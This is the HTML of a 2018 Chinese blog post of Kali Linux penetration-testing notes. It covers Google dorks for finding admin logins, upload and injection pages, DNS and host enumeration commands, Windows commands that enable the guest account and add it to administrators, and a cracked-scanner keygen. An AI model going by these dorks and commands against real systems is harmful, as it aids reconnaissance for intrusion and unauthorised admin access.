@@ -1,0 +1,1801 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="kali,msfconsole,setoolkit," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="喜欢这种东西，捂住嘴巴，也会从眼睛里跑出来！   端口扫描,密码破解,网页木马,内网渗透,dns欺骗,arp欺骗,病毒邮件">
+<meta name="keywords" content="kali,msfconsole,setoolkit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全之kali">
+<meta property="og:url" content="http://ashercode.github.io/post/网络安全之kali.html">
+<meta property="og:site_name" content="王小建">
+<meta property="og:description" content="喜欢这种东西，捂住嘴巴，也会从眼睛里跑出来！   端口扫描,密码破解,网页木马,内网渗透,dns欺骗,arp欺骗,病毒邮件">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-07T00:49:52.035Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网络安全之kali">
+<meta name="twitter:description" content="喜欢这种东西，捂住嘴巴，也会从眼睛里跑出来！   端口扫描,密码破解,网页木马,内网渗透,dns欺骗,arp欺骗,病毒邮件">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'I14VESP3SJ',
+      apiKey: 'a817c1ce9320d227f97800013070f068',
+      indexName: 'AsherCode',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"请输入关键字","hits_empty":"根本找不到好吗: ${query}","hits_stats":"${hits} 条相关记录，耗时 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://ashercode.github.io/post/网络安全之kali.html"/>
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "c9e4f89d"
+    });
+  daovoice('update');
+  </script>
+
+  <title>网络安全之kali | 王小建</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?df44f8c13996af363c362aad197f9bef";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+	
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+<a href="https://github.com/AsherCode" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">王小建</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">AsherCode的个人小站</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ashercode.github.io/post/网络安全之kali.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="AsherCode">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="王小建">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">网络安全之kali</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-07T08:48:25+08:00">
+                2018-03-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/post/网络安全之kali.html" class="leancloud_visitors" data-flag-title="网络安全之kali">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4,577
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  22
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote class="blockquote-center"><p>喜欢这种东西，捂住嘴巴，也会从眼睛里跑出来！ </p>
+</blockquote>
+<div class="note danger"><p>端口扫描,密码破解,网页木马,内网渗透,dns欺骗,arp欺骗,病毒邮件</p></div>
+<a id="more"></a>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="GoogleHacking"><a href="#GoogleHacking" class="headerlink" title="GoogleHacking"></a>GoogleHacking</h2><blockquote>
+<ul>
+<li>intext (仅对Google有效)  将网页中的正文内容中的某个字符作为搜索的条件</li>
+<li>intitle   把网页标题中的某个字符作为搜索的条件<br>  intitle:admin</li>
+<li>cache    搜索引擎中关于某些内容的缓存，可能在过期内容中发现有价值的信息</li>
+<li>filetype     指定一个格式类型的文件作为搜索对象<br>  hello filetype:pdf</li>
+<li>inurl         搜索包含指定字符的URL<br>  inurl:asp?id=</li>
+<li>site        在指定站点搜索相关内容<br>  site:freebuf.com intitle:hello</li>
+<li>“”    把关键字作为引号部分整体搜索</li>
+<li>or     同时搜索两个或多个关键字</li>
+<li>link  搜索某个网站的链接    </li>
+</ul>
+</blockquote>
+<ul>
+<li><p>找管理后台地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com intext:管理|后台|登录|用户名|密码|系统|账号</span><br><span class="line">site:xxx.com inurl:login/admin/manage/manager/admin_login/system</span><br><span class="line">site:xxx.com intitle:管理|后台|登录</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找上传类漏洞地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com inurl:file</span><br><span class="line">site:xxx.com inurl:upload</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找注入页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com inurl:php?id=</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找编辑器页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com inurl:ewebeditor</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="站长工具"><a href="#站长工具" class="headerlink" title="站长工具"></a>站长工具</h2><p><a href="http://ip.chinaz.com/" target="_blank" rel="noopener">http://ip.chinaz.com/</a>                 查询IP<br><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a>    子域名查询<br><a href="http://tool.chinaz.com/port/" target="_blank" rel="noopener">http://tool.chinaz.com/port/</a>        端口扫描<br><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a>             whois网站信息</p>
+<h2 id="常用漏洞平台"><a href="#常用漏洞平台" class="headerlink" title="常用漏洞平台"></a>常用漏洞平台</h2><p><a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a>            搜索ecshop,dececms,中国联通<br><a href="http://loudong.360.cn/" target="_blank" rel="noopener">http://loudong.360.cn/</a><br><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a><br><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a><br><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener">http://www.cnnvd.org.cn/</a><br><a href="http://www.cnvd.org.cn/" target="_blank" rel="noopener">http://www.cnvd.org.cn/</a></p>
+<h2 id="工具获取信息"><a href="#工具获取信息" class="headerlink" title="工具获取信息"></a>工具获取信息</h2><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><p>ping 192.168.0.1  | www.baidu.com<br>arp -a  显示地址解析协议的相关信息<br>tracert www.baidu.com    测试到指定主机经过的路由<br>telnet 192.168.0.1     测试是否开启了远程连接<br>netstat -a      显示目前主机开开放的端口和状态<br>net user wj 123456 /add  添加用户<br>net user          查看所有<br>net user wj      查看用户信息<br>net user guest /active:yes         激活用户<br>net localgroup administrators guest /add        添加用户到管理组</p>
+<h3 id="AWVS-10-5"><a href="#AWVS-10-5" class="headerlink" title="AWVS 10.5"></a>AWVS 10.5</h3><p>安装2016_02_17_00_webvulnscan105.exe，运行Acunetix Web Vulnerability Scanner 10.x Consultant Edition KeyGen.exe<br>添加域名即可个性化获取是否存在漏洞，目录结构等</p>
+<h3 id="zenmap"><a href="#zenmap" class="headerlink" title="zenmap"></a>zenmap</h3><p>检测指定IP或网址服务器开放的端口</p>
+<h3 id="安装kali虚拟机"><a href="#安装kali虚拟机" class="headerlink" title="安装kali虚拟机"></a>安装kali虚拟机</h3><blockquote>
+<ul>
+<li>设置桥接模式，可以拥有真实物理地址，复制物理机网络状态，编辑-虚拟网络编辑器，设置桥接模式的网卡为物理网卡</li>
+<li>kali-linux-2016.2-i386.iso 选择ubuntu,存储为单个文件,net模式</li>
+<li>用户名root,密码123456</li>
+<li>安装vm-tools,vim /etc/apt/sources.list修改源<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<p>apt-get update<br>apt-get dist-upgrade<br>reboot<br>apt-get update<br>apt-get install open-vm-tools-desktop fuse<br>reboot</p>
+<blockquote>
+<ul>
+<li><p>安装输入法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://pinyin.sogou.com/linux/</span><br><span class="line">apt-get install -f</span><br><span class="line">dpkg -i sogoupinyin_2.2.0.0102_i386.deb </span><br><span class="line">注销</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install fcitx</span><br><span class="line">apt-get install fcitx-googlepinyin</span><br><span class="line">reboot</span><br><span class="line">ctrl+space切换</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>网卡操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iconfig -a 查看所有网卡</span><br><span class="line">ifconfig eth0 up  开启网卡</span><br><span class="line">ifconfig etho0 down 禁用网卡</span><br><span class="line">dhclient eth0 dhcp 网络自动获取ip</span><br><span class="line">ifconfig eth0 10.5.224.23 netmask 255.255.255.0 设置ip和子网掩码，vim /etc/network/interfaces永久设置，static为dhcp则为动态</span><br><span class="line">vim /etc/resolv.conf  配置dns</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用户操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser  添加用户及家目录，密码等</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<p>若重启循环Alt+Ctrl+F2，apt-get update</p>
+<h2 id="DNS收集分析"><a href="#DNS收集分析" class="headerlink" title="DNS收集分析"></a>DNS收集分析</h2><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>set type=A 设置解析协议A<br>baidu.com      直接打印dns</p>
+<h3 id="安装dnsdict6"><a href="#安装dnsdict6" class="headerlink" title="安装dnsdict6"></a>安装dnsdict6</h3><p>用于获取网站信息，扫描网站并显示网站有多少域或子域，可以扫描ipv6/ipv4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.thc.org/releases/thc-ipv6-2.7.tar.gz   通过物理机下载后拖拽到虚拟机上</span><br><span class="line">tar -zvxf thc-ipv6-2.7.tar_2.gz </span><br><span class="line">cd thc-ipv6-2.7/</span><br><span class="line">apt-get -f install</span><br><span class="line">make</span><br><span class="line">apt-get install libpcap-dev libssl-dev</span><br><span class="line">cp dnsdict6 /usr/bin/</span><br></pre></td></tr></table></figure></p>
+<p>dnsdict6 -D        自带字典<br>dnsdict6 baidu.com /root/1.txt      指定字典查询<br>dnsdict6 -4 baidu.com      获取ipv4的子域名地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0.baidu.com. =&gt; 180.149.144.203</span><br><span class="line">12.baidu.com. =&gt; 182.61.62.50</span><br><span class="line">1.baidu.com. =&gt; 180.97.36.93</span><br><span class="line">11.baidu.com. =&gt; 220.181.57.55</span><br><span class="line">3b.baidu.com. =&gt; 10.26.10.39</span><br></pre></td></tr></table></figure></p>
+<p>dnsdict6 baidu.com      获取ipv6的子域名地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipv6.baidu.com. =&gt; 2400:da00::dbf:0:100</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>参数：<br>     -4  也转储ipv4地址<br>     -t  num  指定要使用的线程数（默认：8，最大：32）<br>     -D   转储所选择的内置列表，不扫描。<br>     -d   显示在NS和MX DNS域的IPv6信息。MX记录就是专门为电子邮件程序指路,<br>     -s   执行SRV服务名称猜测。记录了哪台计算机提供了哪个服务这么一个简单的信息<br>    -[smlx] 指定字典大小 -s(mall=50), -m(edium=796) (DEFAULT) -l(arge=1416),  -x( treme=3211)</p>
+<h3 id="dnsmap"><a href="#dnsmap" class="headerlink" title="dnsmap"></a>dnsmap</h3><p>dnsmap baidu.com -w 1.txt      指定字典<br>dnsmap qq.com -w /usr/share/dnsmap/wordlist_TLAs.txt -r qq.txt<br>1）使用域名访问服务器someone.net（域名为外部IP）,而这台服务器就建立在局域网内部（有内部IP），在内网访问用IP没有问题，用域名就必须用dnsmap。<br>2）某些城域网必须使用指定的DNS，才能访问城域网内的一些服务器域名，用其他DNS如114.114.114.114,上外部任何网站都没有问题，但解析城域网内的服务器域名无法访问。    </p>
+<h3 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h3><p>区域传输 反向查询 暴力猜解 标准记录枚举 缓存窥探 区域遍历 Google查询<br>dnsrecon -d qq.com<br>dnsrecon -d qq.com -D /usr/share/wordlists/dnsmap.txt -t std –xml dnsrecon.xml    用字典来暴力破解主机名,扫描一个域名,做一次标准扫描,将输出保存到文件</p>
+<h3 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h3><p>暴力破解DNS的方式是一种获取不连续IP地址空间主机的有效手段,默认的字典locate hosts.txt<br>fierce -dns blog.csdn.net -wordlist myDNSwordlist.txt<br>fierce -dns baidu.com -threads 8 -dnsserver 114.114.114.114</p>
+<h3 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a>lbd</h3><p>负载均衡检测器<br>lbd baidu.com 443 https  查看https的负载均衡</p>
+<h3 id="reverseraider"><a href="#reverseraider" class="headerlink" title="reverseraider"></a>reverseraider</h3><p>kali已经废除，backtrack5可以使用<br>./reverseraider -d baidu.com -w wordlists/fast.list</p>
+<h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><p>默认使用的是cat /etc/resolv.conf 的dns服务器<br>host baidu.com 114.114.114.114    -a    手工指定dns服务器,获取DNS服务器信息之后，下一步就是借助DNS服务器找出目标主机IP地址</p>
+<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>dig baidu.com any 对DNS服务器进行挖掘<br>dig baidu.com NS<br>dig baidu.com MX<br>dig baidu.com A<br>dig ns3.baidu.com baidu.com axfr        测试预传输</p>
+<h3 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h3><p>通过谷歌或者字典文件猜测可能存在的域名，获取主机IP地址，该域名的DNS服务器， 该域名的MX记录,自带ls /usr/share/dnsenum/字典<br>dnsenum baidu.com  获取指定网站的邮箱，域名等服务器<br>dnsenum –dnsserver 114.114.114.114 –threads 5 -s 15 –noreverse –private -d 3 -o /root/1.xml wooyun.org<br>dnsenum -f /usr/share/dnsenum/dns.txt baidu.com 暴力破解<br>dnsenum -f /usr/share/dnsenum/dns.txt –dnsserver ns4.baidu.com baidu.com -o baidu.xml  获取子域名</p>
+<h3 id="DMitry"><a href="#DMitry" class="headerlink" title="DMitry"></a>DMitry</h3><p>dmitry -iwnse baidu.com<br>dmitry -w -o /root/桌面/1.txt qq.com<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  -o     Save output to %host.txt or to file specified by -o file  //将输出保存到％host.txt或由-o文件指定的文件</span><br><span class="line">  -i     Perform a whois lookup on the IP address of a host  //对主机的IP地址执行whois查找</span><br><span class="line">  -w     Perform a whois lookup on the domain name of a host  //对主机的域名执行whois查找</span><br><span class="line">  -n     Retrieve Netcraft.com information on a host  //在主机上检索Netcraft.com信息</span><br><span class="line">  -s     Perform a search for possible subdomains  //执行搜索可能的子域</span><br><span class="line">  -e     Perform a search for possible email addresses  //执行搜索可能的电子邮件地址</span><br><span class="line">  -p     Perform a TCP port scan on a host  //在主机上执行TCP端口扫描</span><br><span class="line">* -f     Perform a TCP port scan on a host showing output reporting filtered ports  //在显示输出报告过滤端口的主机上执行TCP端口扫描</span><br><span class="line">* -b     Read in the banner received from the scanned port  //读取从扫描端口接收的banner</span><br><span class="line">* -t 0-9 Set the TTL in seconds when scanning a TCP port ( Default 2 )  //0-9扫描TCP端口时设置TTL（默认为2）</span><br><span class="line">*Requires the -p flagged to be passed  //需要-p标记才能传递</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><h3 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h3><p>arp-scan –interface=eth0 -l 获取 本地网络中的 所有mac 地址<br>arp-scan –interface=eth0 10.5.224.31   获取指定ip的mac</p>
+<h3 id="tcptraceroute"><a href="#tcptraceroute" class="headerlink" title="tcptraceroute"></a>tcptraceroute</h3><blockquote>
+<p>现代网络广泛使用防火墙，导致传统路由跟踪工具发出的（ICMP应答（ICMP echo）或UDP）数据包都被过滤掉了，所以无法进行完整的路由跟踪。尽管如此，许多情况下，防火墙会准许反向（inbound）TCP数据包通过防火墙到达指定端口，这些端口是主机内防火墙背后的一些程序和外界连接用的。通过发送TCP SYN数据包来代替UDP或者ICMP应答数据包，tcptraceroute可以穿透大多数防火墙。</p>
+</blockquote>
+<p>tcptraceroute -i eth0 -f 10 -m 255 -p 3000 baidu.com 路由跟踪</p>
+<h3 id="tctrace"><a href="#tctrace" class="headerlink" title="tctrace"></a>tctrace</h3><p>tctrace -v -p 2 -m 30 -t 2 -D 80 -S 80 -i eth0 -d baidu.com 穿越防火墙路由跟踪</p>
+<h2 id="搜索引擎搜集信息"><a href="#搜索引擎搜集信息" class="headerlink" title="搜索引擎搜集信息"></a>搜索引擎搜集信息</h2><h3 id="metagoofil"><a href="#metagoofil" class="headerlink" title="metagoofil"></a>metagoofil</h3><p>./metagoofil.py -h -o /root/ -f /root/result.html -t pdf 谷歌搜索获取数据<br>./metagoofil.py -d apple.com -t doc,pdf -l 200 -n 50 -o applifiles -f result.html</p>
+<h3 id="goofile"><a href="#goofile" class="headerlink" title="goofile"></a>goofile</h3><p>./goofile.py -d google.com -f txt     搜索下载</p>
+<h3 id="goohost"><a href="#goohost" class="headerlink" title="goohost"></a>goohost</h3><p>./goohost.sh -t baidu.com -m ip -p 10 -v</p>
+<h3 id="fimap"><a href="#fimap" class="headerlink" title="fimap"></a>fimap</h3><p>搜集信息并漏洞攻击<br>fimap -u ‘<a href="http://localhost:test.php?file=bag&amp;id=23" target="_blank" rel="noopener">http://localhost:test.php?file=bag&amp;id=23</a>‘    扫描单一URL寻找FI漏洞<br>fimap -m -l ‘/tmp/urllist.txt’  批量扫描<br>fimap -g -q ‘inurl:include.php’  搜索google<br>fimap -H -u ‘<a href="http://localhost" target="_blank" rel="noopener">http://localhost</a>‘ -d 3 -w /tmp/urllist  深度为3层的搜索抓取指定url</p>
+<h3 id="theharvester"><a href="#theharvester" class="headerlink" title="theharvester"></a>theharvester</h3><p>theharvester -d microsoft.com -l 500 -b bing -f 1.html 通过搜索引擎、PGP服务器以及SHODAN数据库收集用户的email，子域名，主机，雇员名，开放端口和banner信息。<br>theharvester -d www.zhihu.com/ -l 10 -b baidu</p>
+<h3 id="amap"><a href="#amap" class="headerlink" title="amap"></a>amap</h3><p>端口枚举工具<br>amap -bq 192.168.56.1 1-1024</p>
+<h3 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h3><p>fping -g 192.168.1.0/24  搜集内网存活的主机</p>
